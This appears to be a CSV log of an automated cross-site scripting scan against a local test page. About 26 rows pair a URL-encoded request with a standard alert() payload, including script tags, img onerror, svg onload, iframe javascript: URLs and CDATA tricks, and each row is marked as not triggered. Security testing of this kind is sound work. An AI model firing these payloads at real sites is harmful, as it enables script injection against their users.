url,payload,alert_text,xss_triggered
http://localhost:5001/xss?name=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,<script>alert('XSS')</script>,,False
http://localhost:5001/xss?name=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,"""><script>alert('XSS')</script>",,False
http://localhost:5001/xss?name=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E,"""><img src=x onerror=alert('XSS')>",,False
http://localhost:5001/xss?name=%3Csvg/onload%3Dalert%28%27XSS%27%29%3E,<svg/onload=alert('XSS')>,,False
http://localhost:5001/xss?name=%3Ciframe%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,"<iframe src=""javascript:alert('XSS')"">",,False
http://localhost:5001/xss?name=%3Cmath%3E%3Cmi//xlink%3Ahref%3D%22data%3Ax%2Calert%281%29%22%3E,"<math><mi//xlink:href=""data:x,alert(1)"">",,False
http://localhost:5001/xss?name=%3Cvideo%3E%3Csource%20onerror%3D%22alert%28%27XSS%27%29%22%3E,"<video><source onerror=""alert('XSS')"">",,False
http://localhost:5001/xss?name=%3Cdetails%20open%20ontoggle%3Dalert%28%27XSS%27%29%3E,<details open ontoggle=alert('XSS')>,,False
http://localhost:5001/xss?name=%3Cmarquee%20onstart%3Dalert%28%27XSS%27%29%3E,<marquee onstart=alert('XSS')>,,False
http://localhost:5001/xss?name=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,<body onload=alert('XSS')>,,False
http://localhost:5001/xss?name=%22%3E%3Csvg%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,"""><svg><script>alert('XSS')</script>",,False
http://localhost:5001/xss?name=%22%3E%3Cinput%20autofocus%20onfocus%3Dalert%28%27XSS%27%29%3E,"""><input autofocus onfocus=alert('XSS')>",,False
http://localhost:5001/xss?name=%3Cisindex%20type%3Dimage%20src%3D1%20onerror%3Dalert%28%27XSS%27%29%3E,<isindex type=image src=1 onerror=alert('XSS')>,,False
http://localhost:5001/xss?name=%3Cembed%20src%3D%22data%3Aimage/svg%2Bxml%2C%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E%22%3E,"<embed src=""data:image/svg+xml,<svg onload=alert('XSS')>"">",,False
http://localhost:5001/xss?name=%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3C/desc%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E%5D%5D%3E%3C/svg%3E,<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>,,False
http://localhost:5001/xss?name=%3Csvg%3E%3CforeignObject%3E%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E%3C/body%3E%3C/foreignObject%3E%3C/svg%3E,<svg><foreignObject><body onload=alert('XSS')></body></foreignObject></svg>,,False
http://localhost:5001/xss?name=%3Cscript%3Ealert%281%29%3C/script%3E,<script>alert(1)</script>,,False
http://localhost:5001/xss?name=%22%3E%3Cscript%3Ealert%282%29%3C/script%3E,"""><script>alert(2)</script>",,False
http://localhost:5001/xss?name=%3Cimg%20src%3Dx%20onerror%3Dalert%283%29%3E,<img src=x onerror=alert(3)>,,False
http://localhost:5001/xss?name=%3Csvg/onload%3Dalert%284%29%3E,<svg/onload=alert(4)>,,False
http://localhost:5001/xss?name=%3Ciframe%20src%3D%22javascript%3Aalert%285%29%22%3E%3C/iframe%3E,"<iframe src=""javascript:alert(5)""></iframe>",,False
http://localhost:5001/xss?name=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%286%29%3E,"""><img src=x onerror=alert(6)>",,False
http://localhost:5001/xss?name=%3Csvg%3E%3Cscript%3Ealert%287%29%3C/script%3E,<svg><script>alert(7)</script>,,False
http://localhost:5001/xss?name=%22%3E%3Csvg/onload%3Dalert%288%29%3E,"""><svg/onload=alert(8)>",,False
http://localhost:5001/xss?name=%3Cmath%3E%3Cmi//xlink%3Ahref%3D%22javascript%3Aalert%289%29%22%3E,"<math><mi//xlink:href=""javascript:alert(9)"">",,False
http://localhost:5001/xss?name=%3Cbody%20onload%3Dalert%2810%29%3E,<body onload=alert(10)>,,False
http://localhost:5001/xss?name=,,,False
